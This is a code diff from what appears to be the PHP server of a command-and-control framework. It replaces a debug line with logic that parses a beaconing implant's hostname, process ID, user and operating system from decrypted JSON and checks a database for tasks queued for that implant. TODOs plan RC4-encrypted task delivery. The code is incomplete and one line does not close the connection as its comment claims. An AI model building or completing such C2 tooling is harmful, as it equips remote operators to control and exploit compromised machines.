@@ -67,12 +67,29 @@
                 # "true" is needed here so it returns an array instead of an object
                 $implant = json_decode($maybe_decrypted, true);
 
-                # DEBUGGING
-                echo $implant["hostname"] . "\r\n";
+                # Parses implant JSON information
+                $hostname = $implant["hostname"];
+                $process_id = $implant["process_id"];
+                $current_user = $implant["current_user"];
+                $operating_system = $implant["operating_system"];
 
-                # TO DO: Get all implant information from implant array
+                # Determines if we have anything tasked for the beaconing implant
+                # TO DO: Remove "LIMIT 1" and allow it to get all tasks at once instead of being single-threaded
+                $statement = $database_connection->prepare("SELECT * FROM `tasks` WHERE `hostname` = :hostname AND `process_id` = :process_id LIMIT 1");
+                $statement->bindValue(":hostname", $hostname);
+                $statement->bindValue(":process_id", $process_id);
+                $statement->execute();
+                $row_count = $statement->rowCount();
+                $results = $statement->fetchAll(PDO::FETCH_ASSOC);
 
-                # TO DO: Use that gathered information to check for tasking
+                # Kills database connection
+                $statement->connection = null;
+
+                # If we have something tasked
+                # TO DO: Output RC4 encrypted task here
+                if ($row_count == 1) {
+                    echo "We have something tasked";
+                }
             }
         }
     }
